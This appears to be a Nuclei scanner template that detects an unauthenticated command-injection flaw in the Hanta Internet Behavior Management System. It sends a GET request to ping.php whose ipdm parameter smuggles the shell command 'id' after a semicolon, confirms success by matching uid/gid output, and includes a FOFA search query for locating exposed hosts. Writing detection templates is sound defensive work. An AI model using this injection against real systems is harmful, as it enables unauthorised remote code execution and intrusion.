id: hanta-rce

info:
  name: Hanta Internet Behavior Management System - Remote Code Execution
  author: momika233
  severity: high
  description: Hanta Internet Behavior Management System is vulnerable to RCE.
  classification:
    cpe: cpe:2.3:a:hanta:hanta:*:*:*:*:*:*:*:*
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="汉塔科技上网行为管理系统"
    vendor: hanta
    product: hanta
  tags: hanta,rce,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/dgn/dgn_tools/ping.php?ipdm=2;id;"

    matchers-condition: and
    matchers:
      - type: regex
        name: hanta
        cpe: cpe:2.3:a:hanta:hanta:*:*:*:*:*:*:*:*
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"

      - type: word
        name: hanta-2
        cpe: cpe:2.3:a:hanta:hanta:*:*:*:*:*:*:*:*
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
